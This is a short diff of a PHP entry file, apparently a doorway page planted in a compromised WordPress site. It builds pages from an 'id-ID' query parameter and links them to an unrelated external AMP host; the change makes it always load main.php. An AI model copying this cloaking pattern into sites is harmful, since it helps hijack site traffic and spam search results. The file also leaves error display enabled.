@@ -3,14 +3,23 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-if (isset($_GET['id-ID']) && !empty($_GET['id-ID'])) {
-    $page = strtoupper($_GET['id-ID']);
-    $link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+$page   = null;
+$link   = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
+$ampnya = null;
+
+if (!empty($_GET['id-ID'])) {
+    $page   = strtoupper($_GET['id-ID']);
     $ampnya = "https://amp.darat.pro/spentita/" . strtolower($page);
-} 
-else {
-    define('WP_USE_THEMES', true);
-    require __DIR__ . '/../main.php';
+}
+
+// selalu load main.php
+$main = __DIR__ . '/main.php';
+if (file_exists($main)) {
+    require $main;
+    exit;
+} else {
+    http_response_code(500);
+    echo "⚠️ File main.php tidak ditemukan.";
     exit;
 }
 ?>
@@ -1923,6 +1932,7 @@ window.datadog_attributes['pageType']='item:details'
 </body>
 
 </html>
+
 
 
 
